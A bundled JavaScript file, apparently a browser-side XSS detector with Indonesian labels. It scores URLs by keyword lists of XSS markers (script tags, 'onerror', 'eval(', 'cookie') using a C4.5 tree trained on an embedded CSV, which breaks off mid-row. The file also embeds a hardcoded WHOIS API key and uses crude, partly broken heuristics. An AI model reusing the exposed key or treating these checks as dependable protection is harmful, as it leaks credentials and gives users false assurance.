(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
// shim for using process in browser
var process = module.exports = {};

// cached from whatever global is present so that test runners that stub it
// don't break things.  But we need to wrap it in a try catch in case it is
// wrapped in strict mode code which doesn't define any globals.  It's inside a
// function because try/catches deoptimize in certain engines.

var cachedSetTimeout;
var cachedClearTimeout;

function defaultSetTimout() {
    throw new Error('setTimeout has not been defined');
}
function defaultClearTimeout () {
    throw new Error('clearTimeout has not been defined');
}
(function () {
    try {
        if (typeof setTimeout === 'function') {
            cachedSetTimeout = setTimeout;
        } else {
            cachedSetTimeout = defaultSetTimout;
        }
    } catch (e) {
        cachedSetTimeout = defaultSetTimout;
    }
    try {
        if (typeof clearTimeout === 'function') {
            cachedClearTimeout = clearTimeout;
        } else {
            cachedClearTimeout = defaultClearTimeout;
        }
    } catch (e) {
        cachedClearTimeout = defaultClearTimeout;
    }
} ())
function runTimeout(fun) {
    if (cachedSetTimeout === setTimeout) {
        //normal enviroments in sane situations
        return setTimeout(fun, 0);
    }
    // if setTimeout wasn't available but was latter defined
    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
        cachedSetTimeout = setTimeout;
        return setTimeout(fun, 0);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedSetTimeout(fun, 0);
    } catch(e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
            return cachedSetTimeout.call(null, fun, 0);
        } catch(e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
            return cachedSetTimeout.call(this, fun, 0);
        }
    }


}
function runClearTimeout(marker) {
    if (cachedClearTimeout === clearTimeout) {
        //normal enviroments in sane situations
        return clearTimeout(marker);
    }
    // if clearTimeout wasn't available but was latter defined
    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
        cachedClearTimeout = clearTimeout;
        return clearTimeout(marker);
    }
    try {
        // when when somebody has screwed with setTimeout but no I.E. maddness
        return cachedClearTimeout(marker);
    } catch (e){
        try {
            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
            return cachedClearTimeout.call(null, marker);
        } catch (e){
            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
            return cachedClearTimeout.call(this, marker);
        }
    }



}
var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while(len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}

process.nextTick = function (fun) {
    var args = new Array(arguments.length - 1);
    if (arguments.length > 1) {
        for (var i = 1; i < arguments.length; i++) {
            args[i - 1] = arguments[i];
        }
    }
    queue.push(new Item(fun, args));
    if (queue.length === 1 && !draining) {
        runTimeout(drainQueue);
    }
};

// v8 likes predictible objects
function Item(fun, array) {
    this.fun = fun;
    this.array = array;
}
Item.prototype.run = function () {
    this.fun.apply(null, this.array);
};
process.title = 'browser';
process.browser = true;
process.env = {};
process.argv = [];
process.version = ''; // empty string to avoid regexp issues
process.versions = {};

function noop() {}

process.on = noop;
process.addListener = noop;
process.once = noop;
process.off = noop;
process.removeListener = noop;
process.removeAllListeners = noop;
process.emit = noop;
process.prependListener = noop;
process.prependOnceListener = noop;

process.listeners = function (name) { return [] }

process.binding = function (name) {
    throw new Error('process.binding is not supported');
};

process.cwd = function () { return '/' };
process.chdir = function (dir) {
    throw new Error('process.chdir is not supported');
};
process.umask = function() { return 0; };

},{}],2:[function(require,module,exports){
(function (process){(function (){
const C45 = require('c4.5');

const CSVparser = require('papaparse');
const swal = require('sweetalert2');

const apiWHOIS = 'https://www.whoisxmlapi.com/whoisserver/WhoisService?apiKey=at_MUU77fxi6N57F5pnrN9dyXyK5K4Sn&outputFormat=JSON&domainName=';

const url = window.location.href;
const parser = new URL(url);

function domainURL(link) {
    var parser = new URL(link);
    var host = '';
    var hn = parser.hostname.split('.').reverse();
    if (hn[1] == 'co' || hn[1] == "org") {
        host = hn[2] + '.' + hn[1] + '.' + hn[0];
    } else {
        host = hn[1] + '.' + hn[0];
    }
    return host;
}

function isValidURL(string) {
    var res = string.match(/^(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
    return (res !== null);
};

async function DOM_parser(){
    const parsers = new DOMParser();
    var response = await fetch(url);
    switch (response.status) {
        case 200:
            var string = await response.text();
            var dom = parsers.parseFromString(string, 'text/html');
            break;
        case 404:
            console.log('Not Found');
            break;
    }
    return {string: string, dom: dom}
}

function isNumeric(n) {
    return !isNaN(n);
}

function URLLength(url){
    var longCharacters = url.length;
    if (longCharacters > 75){
        longurl = "Lebih dari 75";
    } else if (longCharacters <= 75 && longCharacters >= 54){
        longurl = "Antara 54 dan 75";
    } else {
        longurl = "Kurang dari 54";
    }
    return longurl;
}

function nonStandardPort(url){
    try {
        var res = url.match(/^(http(s)?:\/\/.)?(www\.)?[0-9999]*[a-zA-Z0-9@:%_\+.~#?&//=]*/g);
        result = (res !== null);
        var port = "";
        if (result == true) {
            port = "Terdapat port"; 
        } else {
            port = "Tidak ada port";
        }
        return (port);
    } catch (err) {
        console.log(err);
    }
}

function specialCharacter(url){
    var special = new Array ('</', '">', '/*', '(', ')', '&', '"/>');

    var check = 0;
    for (i = 0; i < special.length; i++){
        if (url.includes(special[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        specialchar = 'Terdapat special character';
    } else {
        specialchar = 'Tidak ada special character';
    }
    return specialchar;
}

function duplicateCharacter(url){    
    var duplicate = new Array ('///', '<<', '>>', '((', '))');

    var check = 0;
    for (i = 0; i < duplicate.length; i++){
        if (url.includes(duplicate[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        duplicatechar = 'Terdapat duplicate character';
    } else {
        duplicatechar = 'Tidak ada duplicate character';
    }
    return duplicatechar;
}

function ServerFormHandler(parser) {
    const anchors = parser.getElementsByTagName('a');
    var check = 0;
    for (let anchor of anchors) {
        let href = anchor.attributes.href;
        if (href) {
            getDomainFromAnchor = isValidURL(href.value);
            if (getDomainFromAnchor == true) {
                var url_domain = domainURL(url);
                var getDomainFromAnchor = domainURL(href.value);
                if (getDomainFromAnchor != url_domain) {
                    check = 1;
                    break;
                }
            }
        }
    }

    if (check == 1) {
        urlOfServerFormHandler = 'Mengarah ke domain berbeda';
    } else {
        urlOfServerFormHandler = 'Mengarah ke domain sendiri'
    }
    return urlOfServerFormHandler;
}

async function AbnormalURL() {
    var domainurl = domainURL(url);
    let response = await fetch(apiWHOIS + domainurl);   
    let urlInWHOISInfo = await response.json();
    if (urlInWHOISInfo) {
        if (urlInWHOISInfo.WhoisRecord.dataError == "IN_COMPLETE_DATA" || urlInWHOISInfo.WhoisRecord.dataError == "MISSING_WHOIS_DATA" || urlInWHOISInfo.WhoisRecord.parseCode == 0) {
            urlInWHOIS = "Tidak tersimpan di database whois";
        } else {
            urlInWHOIS = "Tersimpan di database whois";
        }
    } else {
        urlInWHOIS = "Tidak tersimpan di database whois";
    }

    return urlInWHOIS;
}

function obfuscatedURL(url){
    var uri = decodeURI(url);
    var uriComp = decodeURIComponent(url);
    var base = url.slice(-2);
    var unesc = unescape(url);

    if (url == uri || url == uriComp || base == "==" || url.charAt(url.length-1) == "=" || url == unesc){
        deobfucation_url = "Tidak obfuscated";
    } else {
        deobfucation_url = "Ada obfuscated";
    }
    return deobfucation_url;
}

function numberOfThirdPartyDomain(url){
    var urls = decodeURIComponent(url);
    var urlSplit = urls.split(/\/\/(.+)/)[1];
    var linkSplitStr = urlSplit.split(/\/(.+)/);

    var check = 0;
    for (i = 1; i < linkSplitStr.length; i++){
        if ((linkSplitStr[i].includes("http") || linkSplitStr[i].includes("https"))){
            check = 1;
            break;
        }
    }

    if (check == 1){
        thirdPartyDomain = "Ada third-party domain";
    } else {
        thirdPartyDomain = "Tidak ada third-party domain";
    }
    return thirdPartyDomain;
}

function requestForCookie(url){
    var cookie = url.includes("cookie");
    if (cookie == true){
        url_cookie = 'Ada request cookie';
    } else {
        url_cookie = 'Tidak ada request cookie';
    }
    return url_cookie;
}

function htmlTags(url){
    var tags = new Array ("<script>", "<iframe", "<meta", "<h1",
                          "<form", "<img", "<textarea", "<div",
                          "<title", "<style", "<object", "<a", "<br>");

    var check = 0;
    for (i = 0; i < tags.length; i++){
        if (url.toLowerCase().includes(tags[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        tag_html = 'Terdapat HTML tags';
    } else {
        tag_html = 'Tidak ada HTML tags';
    }
    return tag_html;
}

function htmlProperties(url){
    var properties = new Array ('href', 'http-equiv', 'action', 'src', 'lowsrc');

    var check = 0;
    for (i = 0; i < properties.length; i++){
        if (url.includes(properties[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        properties_html = 'Terdapat HTML properties';
    } else {
        properties_html = 'Tidak ada HTML properties';
    }
    return properties_html;
}

function eventHandler(url){
    var event = new Array ('onclick', 'onmouseover', 'onerror', 'onload', 'onfocus');

    var check = 0;
    for (i = 0; i < event.length; i++){
        if (url.includes(event[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        handler = 'Terdapat EventHandler';
    } else {
        handler = 'Tidak ada EventHandler';
    }
    return handler;
}

function domObjects(url){
    var objects = new Array ('windows', 'location', 'document');

    var check = 0;
    for (i = 0; i < objects.length; i++){
        if (url.toLowerCase().includes(objects[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        objects_dom = 'Terdapat DOM objects';
    } else {
        objects_dom = 'Tidak ada DOM objects';
    }
    return objects_dom;
}

function javascriptMethod(url){
    var method = new Array ('write(', 'getElementsByTagName(', 'alert(', 'eval(', 'fromCharCode(');

    var check = 0;
    for (i = 0; i < method.length; i++){
        if (url.includes(method[i])){
            check = 1;
            break;
        }
    }

    if (check == 1){
        js_method = 'Terdapat javascript method';
    } else {
        js_method = 'Tidak ada javascript method';
    }
    return js_method;
}

(async () => {
    var dom = await DOM_parser();

    let length_URL = URLLength(url);
    let port_on_url = nonStandardPort(url);
    let special_character = specialCharacter(url);
    let duplicated_character = duplicateCharacter(url);
    let URL_of_SFH = ServerFormHandler(dom.dom);
    let abnormal_URL = await AbnormalURL();
    let obfuscated_URL = obfuscatedURL(url);
    let number_of_subdomain = numberOfThirdPartyDomain(url);
    let request_cookie = requestForCookie(url);
    // let google_index = googleIndex(url);
    let html_tags = htmlTags(url);
    let html_properties = htmlProperties(url);
    let event_handler = eventHandler(url);
    let dom_objects = domObjects(url);
    let javascript_method = javascriptMethod(url);

    var all_features = [];
    await all_features.push(length_URL,
                            port_on_url,
                            special_character,
                            duplicated_character,
                            URL_of_SFH,
                            abnormal_URL,
                            obfuscated_URL,
                            number_of_subdomain,
                            request_cookie,
                            // google_index,
                            html_tags,
                            html_properties,
                            event_handler,
                            dom_objects,
                            javascript_method);

    // return all_features;
    console.log(all_features);

    await process.nextTick(function(){(function(err, data) {
        if (err) {
            console.log(err);
            return false;
        }
        CSVparser.parse(data, {
            complete: function (result) {
                var headers = result.data[0];
                var features = headers.slice(1, -1);
                var target = headers[headers.length-1];

                var trainingData = result.data.slice(1).map(function(d) {
                    return d.slice(1);
                });

                var featureTypes = trainingData[0].map(function(d) {
                    return isNumeric(d) ? 'number' : 'category';
                });

                var c45 = C45();
            
                c45.train ({
                    data: trainingData,
                    target: target,
                    features: features,
                    featureTypes: featureTypes
                }, function(error, model) {
                    if (error) {
                        console.error(error);
                    }
                    if (model.classify(all_features) == 'XSS') {
                        swal.fire ({
                            imageUrl: 'https://www.pngkey.com/png/full/881-8812373_open-warning-icon-png.png',
                            imageWidth: 50,
                            imageHeight: 50,
                            imageAlt: 'Image Warning',
                            title: 'This website has XSS attack!',
                            text: "Please don't visit this website, it can steal your data."
                        });
                    }
                });
            }
        });
    })(null,"url;url_length;Non-Standard Port on URL;Special Character;Duplicated Character;server_form_handler;abnormal_url;obfuscated_code;number_of_third-party_domain;request_for_cookie;html_tags;html_properties;event_handler;dom_object;javascript_method;label\r\nhttp://1501broadway.com/;Kurang dari 54;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://abcnews.go.com/Business/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://academic.brooklyn.cuny.edu/education/jlemke/webs/gender/tsld002.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://ai-depot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://aiinfinance.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://algo.inria.fr/AofA/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://algo.inria.fr/AofA/Problems/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://appliedprob.society.informs.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://artilect.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://artsavant.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://athos.rutgers.edu/ml4um/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://awriteresume.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://bmwusfactory.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://breyton.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://broadway.yahoo.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://broadwayworld.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://cgi.csc.liv.ac.uk/~ped/teachadmin/algor/algor.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://cgm.cs.mcgill.ca/~godfried/teaching/algorithms-web.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://cgm.cs.mcgill.ca/~godfried/teaching/pr-web.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://coloradodrama.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://context.umcs.maine.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://crc-congo.tripod.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://cryptography.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://db.uwaterloo.ca/~alopez-o/math-faq/node21.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://editor.altervista.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://eqworld.ipmnet.ru/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://faculty.uml.edu/jpropp/somos.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://finance.pro2net.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://financeservices.about.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://front.math.ucdavis.edu/math.AP;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://front.math.ucdavis.edu/math.PR;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://gfm.cii.fc.ul.pt/people/jrezende/jr_polar-repr.pdf;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://grail.cba.csuohio.edu/~somos/somospol.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://home.earthlink.net/~dwaha/research/machine-learning.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://home.earthlink.net/~jenniewebb/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://hosted.ap.org/lineups/BUSINESSHEADS-rss_2.0.xml?SITE=RANDOM&SECTION=HOME;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://icccr.tc.columbia.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://information-management-architect.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://jobsearchtech.about.com/library/weekly/aa083099.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://keithbriggs.info/klein-polyhedra.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://kroc.nd.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://languagelog.ldc.upenn.edu/nll/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://liinwww.ira.uka.de/bibliography/Ai/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://mamet.eserver.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://math.bu.edu/DYSYS/ode-bif/ode-bif.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://math.nju.edu.cn/~zwsun/csz.htm;Kurang dari 54;Tidak ada 